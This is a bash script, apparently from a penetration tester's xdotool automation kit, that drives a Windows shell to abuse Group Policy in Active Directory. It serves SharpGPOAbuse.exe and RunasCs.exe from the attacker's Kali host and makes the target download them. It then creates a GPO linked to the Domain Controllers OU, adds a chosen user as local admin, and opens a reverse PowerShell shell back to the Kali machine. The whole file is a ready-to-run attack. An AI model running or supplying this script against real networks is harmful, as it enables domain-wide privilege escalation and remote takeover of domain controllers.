#!/bin/bash

: '
ps: do a GPO abuse
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "HTTP port" "Shell port" "DC" "Username" "Password"

HTTP_PORT=${form_data["HTTP port"]}
SHELL_PORT=${form_data["Shell port"]}
DC=${form_data["DC"]}
USERNAME=${form_data["Username"]}
PASSWORD=${form_data["Password"]}

cd ~/Desktop/base/code/xdotool/scripts/windows/activeDirectroy/sharpGPOAbuse/.files
python3 -m http.server ${HTTP_PORT} &
HTTP_PID=$!

TMP_FOLDER="C:\temp"
GPO_NAME="doesnotmatter"

paste_command "New-Item -Path \"c:\\\" -Name "temp" -ItemType \"directory\""
xdotool key Return
sleep 0.8

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${HTTP_PORT}/SharpGPOAbuse.exe', '${TMP_FOLDER}\SharpGPOAbuse.exe')"
xdotool key Return
sleep 2

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${HTTP_PORT}/RunasCs.exe', '${TMP_FOLDER}\RunasCs.exe')"
xdotool key Return
sleep 2

paste_command "New-GPO -Name \"${GPO_NAME}\""
xdotool key Return
sleep 1

paste_command "New-GPLink -Name \"${GPO_NAME}\" -Target \"OU=Domain Controllers,DC=${DC}\""
xdotool key Return
sleep 1

paste_command "${TMP_FOLDER}\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount ${USERNAME} --GPOName ${GPO_NAME}"
xdotool key Return
sleep 3

paste_command "gpupdate /force"
xdotool key Return
sleep 2

paste_command "${TMP_FOLDER}\RunasCs.exe "${USERNAME}" '${PASSWORD}' powershell.exe -r ${KALI_IP}:${SHELL_PORT}"
xdotool key Return

sleep 60
kill $HTTP_PID